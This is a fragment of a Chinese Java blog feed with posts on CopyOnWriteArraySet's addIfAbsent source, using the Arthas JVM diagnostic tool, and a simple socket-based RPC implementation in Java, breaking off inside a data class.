*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> al.addIfAbsent(e);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="addIfAbsent"><a href="#addIfAbsent" class="headerlink" title="addIfAbsent"></a>addIfAbsent</h4><p>如果当前元素在数组的下标不为-1，返回false，不添加，否则添加新元素</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Appends the element, if not present.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> e element to be added to this list, if absent</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> &#123;<span class="doctag">@code</span> true&#125; if the element was added</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">addIfAbsent</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">        Object[] snapshot = getArray();</span><br><span class="line">        <span class="keyword">return</span> indexOf(e, snapshot, <span class="number">0</span>, snapshot.length) &gt;= <span class="number">0</span> ? <span class="keyword">false</span> :</span><br><span class="line">            addIfAbsent(e, snapshot);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="addIfAbsent-E-Object"><a href="#addIfAbsent-E-Object" class="headerlink" title="addIfAbsent(E, Object[])"></a>addIfAbsent(E, Object[])</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A version of addIfAbsent using the strong hint that given</span></span><br><span class="line"><span class="comment">     * recent snapshot does not contain e.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">addIfAbsent</span><span class="params">(E e, Object[] snapshot)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> ReentrantLock lock = <span class="keyword">this</span>.lock;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object[] current = getArray();</span><br><span class="line">            <span class="keyword">int</span> len = current.length;</span><br><span class="line">            <span class="keyword">if</span> (snapshot != current) &#123;</span><br><span class="line">                <span class="comment">// Optimize for lost race to another addXXX operation</span></span><br><span class="line">                <span class="keyword">int</span> common = Math.min(snapshot.length, len);</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; common; i++)</span><br><span class="line">                    <span class="keyword">if</span> (current[i] != snapshot[i] &amp;&amp; eq(e, current[i]))</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">if</span> (indexOf(e, current, common, len) &gt;= <span class="number">0</span>)</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            Object[] newElements = Arrays.copyOf(current, len + <span class="number">1</span>);</span><br><span class="line">            newElements[len] = e;</span><br><span class="line">            setArray(newElements);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>COW</tag>
        <tag>CopyOnWriteArrayList</tag>
        <tag>CopyOnWriteArraySet</tag>
        <tag>写时复制</tag>
      </tags>
  </entry>
  <entry>
    <title>JVM辅助定位工具Arthas</title>
    <url>/2020/04/08/Java/JVM/2020-04-08-Java-jvm%E8%BE%85%E5%8A%A9%E5%AE%9A%E4%BD%8D%E5%B7%A5%E5%85%B7Arthas/</url>
    <content><![CDATA[<h1 id="JVM辅助定位工具Arthas"><a href="#JVM辅助定位工具Arthas" class="headerlink" title="JVM辅助定位工具Arthas"></a>JVM辅助定位工具Arthas</h1><h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><blockquote>
<p>java -jar arthas-boot.jar</p>
</blockquote>
<ul>
<li>执行该程序的用户需要和目标进程具有相同的权限。比如以<code>admin</code>用户来执行：<code>sudo su admin &amp;&amp; java -jar arthas-boot.jar</code> 或 <code>sudo -u admin -EH java -jar arthas-boot.jar</code>。</li>
<li>如果attach不上目标进程，可以查看<code>~/logs/arthas/</code> 目录下的日志。</li>
<li>如果下载速度比较慢，可以使用aliyun的镜像：<code>java -jar arthas-boot.jar --repo-mirror aliyun --use-http</code></li>
<li><code>java -jar arthas-boot.jar -h</code> 打印更多参数信息。</li>
</ul>
<p>选择应用Java进程：</p>
<p><img src="https://huhansi.github.io/images/2020-04-08-arthas1.png" alt="选择需要诊断的进程"></p>
<p>回车之后，Arthas就会去Attach选择的进程，成功之后就出现以下画面：</p>
<p><img src="https://huhansi.github.io/images/2020-04-08-arthas2.png" alt="Attach成功"></p>
<h3 id="查看进程信息"><a href="#查看进程信息" class="headerlink" title="查看进程信息"></a>查看进程信息</h3><p>输入<code>dashboard</code>，按回车/enter，会展示当前进程信息，按<code>ctrl+c</code>可中断执行</p>
<p><img src="https://huhansi.github.io/images/2020-04-08-arthas3.png" alt="查看进程信息"></p>
<h3 id="查看线程信息"><a href="#查看线程信息" class="headerlink" title="查看线程信息"></a>查看线程信息</h3><p>输入<code>thread</code>，按回车/enter，会展示当前线程信息</p>
<p><img src="https://huhansi.github.io/images/2020-04-08-arthas4.png" alt="查看线程信息"></p>
<h4 id="查看指定线程信息"><a href="#查看指定线程信息" class="headerlink" title="查看指定线程信息"></a>查看指定线程信息</h4><p>输入命令<code>thread threadid</code>，展示指定线程的信息</p>
<p><img src="https://huhansi.github.io/images/2020-04-08-arthas5.png" alt="查看线程信息"></p>
<h3 id="查看jvm信息"><a href="#查看jvm信息" class="headerlink" title="查看jvm信息"></a>查看jvm信息</h3><p>输入命令<code>jvm</code>，查看jvm信息</p>
<p><img src="https://huhansi.github.io/images/2020-04-08-arthas6.png" alt="查看jvm信息"></p>
<h3 id="查看和修改jvm的系统属性"><a href="#查看和修改jvm的系统属性" class="headerlink" title="查看和修改jvm的系统属性"></a>查看和修改jvm的系统属性</h3><h4 id="查看所有的系统属性"><a href="#查看所有的系统属性" class="headerlink" title="查看所有的系统属性"></a>查看所有的系统属性</h4><p>输入命令<code>sysprop</code>，查看jvm的系统属性</p>
<p><img src="https://huhansi.github.io/images/2020-04-08-arthas7.png" alt="查看jvm系统属性"></p>
<h4 id="查看指定的系统属性"><a href="#查看指定的系统属性" class="headerlink" title="查看指定的系统属性"></a>查看指定的系统属性</h4><p>输入命令<code>sysprop properties-name</code></p>
<p><img src="https://huhansi.github.io/images/2020-04-08-arthas9.png" alt="查看指定系统属性"></p>
<h4 id="修改系统属性"><a href="#修改系统属性" class="headerlink" title="修改系统属性"></a>修改系统属性</h4><p>输入命令<code>sysprop properties-name properties-new-value</code></p>
<p><img src="https://huhansi.github.io/images/2020-04-08-arthas10.png" alt="修改指定系统属性"></p>
<h3 id="查看JVM的环境变量"><a href="#查看JVM的环境变量" class="headerlink" title="查看JVM的环境变量"></a>查看JVM的环境变量</h3><p>输入命令<code>sysenv</code>，查看jvm的环境变量</p>
<p><img src="https://huhansi.github.io/images/2020-04-08-arthas8.png" alt="查看jvm系统属性"></p>
<h4 id="查看指定的环境变量"><a href="#查看指定的环境变量" class="headerlink" title="查看指定的环境变量"></a>查看指定的环境变量</h4><p>输入命令<code>sysenv env-name</code></p>
<p><img src="https://huhansi.github.io/images/2020-04-08-arthas11.png" alt="查看指定系统属性"></p>
<h3 id="查看，更新VM诊断相关的参数"><a href="#查看，更新VM诊断相关的参数" class="headerlink" title="查看，更新VM诊断相关的参数"></a>查看，更新VM诊断相关的参数</h3><h4 id="查看VM诊断相关参数"><a href="#查看VM诊断相关参数" class="headerlink" title="查看VM诊断相关参数"></a>查看VM诊断相关参数</h4><p>输入命令<code>vmoption</code>，查看VM诊断的参数</p>
<p><img src="https://huhansi.github.io/images/2020-04-08-arthas12.png" alt="查看VM诊断参数"></p>
<h4 id="查看指定option"><a href="#查看指定option" class="headerlink" title="查看指定option"></a>查看指定option</h4><p>输入命令<code>vmoption option-name</code></p>
<p><img src="https://huhansi.github.io/images/2020-04-08-arthas13.png" alt="查看指定VM诊断参数"></p>
<h4 id="修改VM诊断相关参数"><a href="#修改VM诊断相关参数" class="headerlink" title="修改VM诊断相关参数"></a>修改VM诊断相关参数</h4><p>输入命令<code>vmoption option-name optin-new-value</code></p>
<p><img src="https://huhansi.github.io/images/2020-04-08-arthas14.png" alt="修改指定VM诊断参数"></p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>可参考<a href="https://alibaba.github.io/arthas/advanced-use.html" target="_blank" rel="noopener">Arthas使用文档</a></p>
]]></content>
      <categories>
        <category>JVM</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>JVM</tag>
        <tag>Arthas</tag>
      </tags>
  </entry>
  <entry>
    <title>RPC的原理及其简单实现</title>
    <url>/2020/04/08/Java/%E5%88%86%E5%B8%83%E5%BC%8F/%E5%88%86%E5%B8%83%E5%BC%8F-rpc%E5%8E%9F%E7%90%86%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="RPC的原理及其简单实现"><a href="#RPC的原理及其简单实现" class="headerlink" title="RPC的原理及其简单实现"></a>RPC的原理及其简单实现</h1><h2 id="什么是RPC"><a href="#什么是RPC" class="headerlink" title="什么是RPC"></a>什么是RPC</h2><p>RPC，全称为Remote Procedure Call，即远程过程调用。它的目的是使调用远程服务像调用本地服务一样。</p>
<p>RPC可基于HTTP或TCP协议，Web Service就是基于HTTP协议的RPC，它具有良好的跨平台性，但其性能却不如基于 TCP 协议的 RPC。会两方面会直接影响 RPC 的性能，一是传输方式，二是序列化。</p>
<h2 id="RPC简易架构"><a href="#RPC简易架构" class="headerlink" title="RPC简易架构"></a>RPC简易架构</h2><p>RPC可简化为如下架构：</p>
<p><img src="https://huhansi.github.io/images/2020-04-08-rpc1.png" alt="rpc简易架构"></p>
<p>调用步骤为：</p>
<ol>
<li>客户端函数调用客户端句柄，执行传送参数</li>
<li>调用本地系统内核发送网络消息</li>
<li>消息通过tcp或者自定义协议或者其他协议传送到服务端</li>
<li>服务端句柄获取消息及参数</li>
<li>执行远程过程</li>
<li>将远程过程的结果返回给服务器句柄</li>
<li>服务器句柄返回结果，调用远程系统内核发送网络消息</li>
<li>本地主机获取返回消息</li>
<li>客户端句柄通过内核接受消息</li>
<li>客户端接收句柄返回的数据</li>
</ol>
<p>RPC可按照角色分为3类：</p>
<ul>
<li>服务提供者：由框架提供，运行在服务端，发布服务、接收客户端消息、返回消息</li>
<li>服务调用者：由框架提供，运行在客户端，生成代理对象、调用远程服务</li>
<li>服务具体实现：由使用框架者提供，运行在服务器，服务接口、接口实现类</li>
</ul>
<h2 id="RPC简易实现"><a href="#RPC简易实现" class="headerlink" title="RPC简易实现"></a>RPC简易实现</h2><h3 id="Server端"><a href="#Server端" class="headerlink" title="Server端"></a>Server端</h3><h4 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h4><p>在服务端利用Socket监听指定端口，并启用线程池来执行客户端的请求。</p>
<p>注册服务service.registerService(StudentService.class, StudentServiceImpl.class);</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> ServerSocket serverSocket;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> servPort;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Server</span><span class="params">(<span class="keyword">int</span> port)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.servPort = port;</span><br><span class="line">        serverSocket = <span class="keyword">new</span> ServerSocket(<span class="keyword">this</span>.servPort);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span></span>&#123;</span><br><span class="line">        ThreadPoolExecutor threadPool =<span class="keyword">new</span> ThreadPoolExecutor(<span class="number">5</span>, <span class="number">10</span>,</span><br><span class="line">                <span class="number">200</span>, TimeUnit.SECONDS, <span class="keyword">new</span> ArrayBlockingQueue&lt;Runnable&gt;(<span class="number">10</span>));</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Socket sock = serverSocket.accept();</span><br><span class="line">                ServerService service = <span class="keyword">new</span> ServerService(sock);</span><br><span class="line">                service.registerService(StudentService<span class="class">.<span class="keyword">class</span>, <span class="title">StudentServiceImpl</span>.<span class="title">class</span>)</span>;</span><br><span class="line">                threadPool.execute(service);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                System.out.println(e.getMessage());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ServerService"><a href="#ServerService" class="headerlink" title="ServerService"></a>ServerService</h4><p>ServerService实现了Runnable接口，便于提交给线程池执行</p>
<p>而后从Socket读取数据，转为Request对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServerService</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> Socket sockClient;</span><br><span class="line">	<span class="keyword">private</span> Map&lt;String, Class&lt;?&gt;&gt; serviceRegistry = <span class="keyword">new</span> HashMap&lt;String, Class&lt;?&gt;&gt;();</span><br><span class="line">	<span class="keyword">private</span> Response response = <span class="keyword">new</span> Response();</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">ServerService</span><span class="params">(Socket sock)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>();</span><br><span class="line">		<span class="keyword">this</span>.sockClient = sock;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			OutputStream out = sockClient.getOutputStream();</span><br><span class="line">			<span class="comment">// 建立好连接后，从socket中获取输入流，并建立缓冲区进行读取</span></span><br><span class="line">			InputStream in = sockClient.getInputStream();</span><br><span class="line"></span><br><span class="line">			ObjectInputStream objIn = <span class="keyword">new</span> ObjectInputStream(in);</span><br><span class="line">			ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(out);</span><br><span class="line"></span><br><span class="line">			<span class="comment">// 2. 获取请求数据，强转参数类型</span></span><br><span class="line">			Object param = objIn.readObject();</span><br><span class="line">			Request request = <span class="keyword">null</span>;</span><br><span class="line">			<span class="keyword">if</span> (!(param <span class="keyword">instanceof</span> Request)) &#123;</span><br><span class="line">				response.setMessage(<span class="string">"参数错误"</span>);</span><br><span class="line">				objOut.writeObject(response);</span><br><span class="line">				objOut.flush();</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				request = (Request) param;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">// 3. 查找并执行服务方法</span></span><br><span class="line">			System.out.println(<span class="string">"要执行的类型为："</span> + request.getClassName());</span><br><span class="line">			Class&lt;?&gt; service = serviceRegistry.get(request.getClassName());</span><br><span class="line">			<span class="keyword">if</span> (service != <span class="keyword">null</span>) &#123;</span><br><span class="line">				Method method = service.getMethod(request.getMethodName(), request.getParamTypes());</span><br><span class="line">				Object result = method.invoke(service.newInstance(), request.getParams());</span><br><span class="line">				<span class="comment">// 4. 得到结果并返回</span></span><br><span class="line">				response.setObj(result);</span><br><span class="line">			&#125;</span><br><span class="line">			objOut.writeObject(response);</span><br><span class="line">			objOut.flush();</span><br><span class="line">			out.close();</span><br><span class="line">			in.close();</span><br><span class="line">			sockClient.close();</span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">			System.out.println(e.getMessage());</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerService</span><span class="params">(Class&lt;?&gt; iface, Class&lt;?&gt; Imp)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.serviceRegistry.put(iface.getName(), Imp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="StudentService"><a href="#StudentService" class="headerlink" title="StudentService"></a>StudentService</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">StudentService</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> Student <span class="title">getInfo</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">(Student stu)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="StudentServiceImpl"><a href="#StudentServiceImpl" class="headerlink" title="StudentServiceImpl"></a>StudentServiceImpl</h4><p>StudentServiceImpl是StudentService的实现类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StudentServiceImpl</span> <span class="keyword">implements</span> <span class="title">StudentService</span> </span>&#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Student <span class="title">getInfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">		stu.setID(<span class="string">"123456"</span>);</span><br><span class="line">		stu.setAge(<span class="number">10</span>);</span><br><span class="line">		stu.setName(<span class="string">"xxxx"</span>);</span><br><span class="line">		<span class="keyword">return</span> stu;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">(Student stu)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Client端"><a href="#Client端" class="headerlink" title="Client端"></a>Client端</h3><h4 id="SocketClient"><a href="#SocketClient" class="headerlink" title="SocketClient"></a>SocketClient</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SocketClient</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> Socket sock;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">SocketClient</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Request request, String Ip, <span class="keyword">int</span> port)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">		sock = <span class="keyword">new</span> Socket(Ip, port);</span><br><span class="line">		InputStream in = sock.getInputStream();</span><br><span class="line">		OutputStream out = sock.getOutputStream();</span><br><span class="line">		ObjectOutputStream objOut;</span><br><span class="line">		ObjectInputStream objIn;</span><br><span class="line">		Response response = <span class="keyword">null</span>;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			objOut = <span class="keyword">new</span> ObjectOutputStream(out);</span><br><span class="line">			objOut.writeObject(request);</span><br><span class="line">			objOut.flush();</span><br><span class="line">			objIn = <span class="keyword">new</span> ObjectInputStream(in);</span><br><span class="line">			Object res = objIn.readObject();</span><br><span class="line">			<span class="keyword">if</span> (res <span class="keyword">instanceof</span> Response) &#123;</span><br><span class="line">				response = (Response) res;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"返回不正确!!!"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">			System.out.println(<span class="string">"error:   "</span> + e.getMessage());</span><br><span class="line">		&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">			out.close();</span><br><span class="line">			in.close();</span><br><span class="line">			sock.close();</span><br><span class="line">			<span class="keyword">return</span> response.getObj();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="SocketClientProxy"><a href="#SocketClientProxy" class="headerlink" title="SocketClientProxy"></a>SocketClientProxy</h4><p>SocketClientProxy创建代理对象，拦截代理对象执行方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SocketClientProxy</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> SocketClient sock = <span class="keyword">new</span> SocketClient();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">getProxy</span><span class="params">(Class&lt;T&gt; clazz)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> (T) Proxy.newProxyInstance(clazz.getClassLoader(), <span class="keyword">new</span> Class&lt;?&gt;[] &#123; clazz &#125;, <span class="keyword">new</span> InvocationHandler() &#123;</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">				Request request = <span class="keyword">new</span> Request();</span><br><span class="line">				request.setClassName(method.getDeclaringClass().getName());</span><br><span class="line">				request.setMethodName(method.getName());</span><br><span class="line">				request.setParamTypes(method.getParameterTypes());</span><br><span class="line">				request.setParams(args);</span><br><span class="line">				<span class="keyword">return</span> sock.invoke(request, <span class="string">"127.0.0.1"</span>, <span class="number">12000</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="公共"><a href="#公共" class="headerlink" title="公共"></a>公共</h3><h4 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Request</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> String className;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> String methodName;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> Object[] params;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> Class&lt;?&gt;[] paramTypes;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getClassName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> className;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setClassName</span><span class="params">(String className)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.className = className;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getMethodName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> methodName;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMethodName</span><span class="params">(String methodName)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.methodName = methodName;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> Object[] getParams() &#123;</span><br><span class="line">		<span class="keyword">return</span> params;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setParams</span><span class="params">(Object[] params)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.params = params;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> Class&lt;?&gt;[] getParamTypes() &#123;</span><br><span class="line">		<span class="keyword">return</span> paramTypes;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setParamTypes</span><span class="params">(Class&lt;?&gt;[] paramTypes)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.paramTypes = paramTypes;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Response</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> String message;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> Object obj;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getMessage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> message;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMessage</span><span class="params">(String message)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.message = message;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Object <span class="title">getObj</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> obj;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setObj</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.obj = obj;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Student"><a href="#Student" class="headerlink" title="Student"></a>Student</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">3L</span>;</span><br><span class="line">	<span class="keyword">private</span> String ID;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getID</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> ID;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setID</span><span class="params">(String ID)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.ID = ID;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> String name;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">	<span class="keyword">private</span> String school;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.name = name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> age;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.age = age;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getSchool</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> school;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSchool</span><span 